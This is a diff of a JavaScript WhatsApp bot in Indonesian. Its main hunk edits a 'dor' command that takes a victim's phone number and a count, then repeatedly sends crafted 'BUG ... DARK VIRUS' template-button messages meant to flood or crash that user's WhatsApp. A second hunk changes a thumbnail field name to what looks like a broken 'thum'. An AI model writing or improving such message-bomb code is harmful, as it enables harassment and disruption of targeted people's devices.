@@ -3706,8 +3706,9 @@ case 'dor': {
  if (!q) return reply(`Nomor target nya mana banh?\nContoh: ${command} 628xxx|5`)
  let [nomor_bug, jumlah_bug] = q.split('|')
  num = `${nomor_bug}`+'@s.whatsapp.net'
-for (let i = 0; i < jumlah_bug; i++) {
-conn.sendMessage(num, {
+let fixjumbelah = jumlah_bug ? jumlah_bug * 1 : 10
+        for (let i = fixjumbelah; i > 0; i--) {
+          if (i !== 0) conn.sendMessage(num, {
 text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️', 
 templateButtons: [
    { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
@@ -4973,7 +4974,7 @@ conn.sendMessage(from, {video:{url:i.url}, caption:`Type : ${i.type}`, mimetype:
           { buttonId: `${prefix}ytmp4 ${q}`, buttonText: { displayText: '⋮☰ VIDEO' }, type: 1 }
         ]
         var but_menu = {
-          image: { url: yytt.result.thumb },
+          image: { url: yytt.result.thum },
           caption: txt_ytdl,
           footer: 'Klik tombol dibawah untuk mendownload media',
           buttons: btn_ytdl,
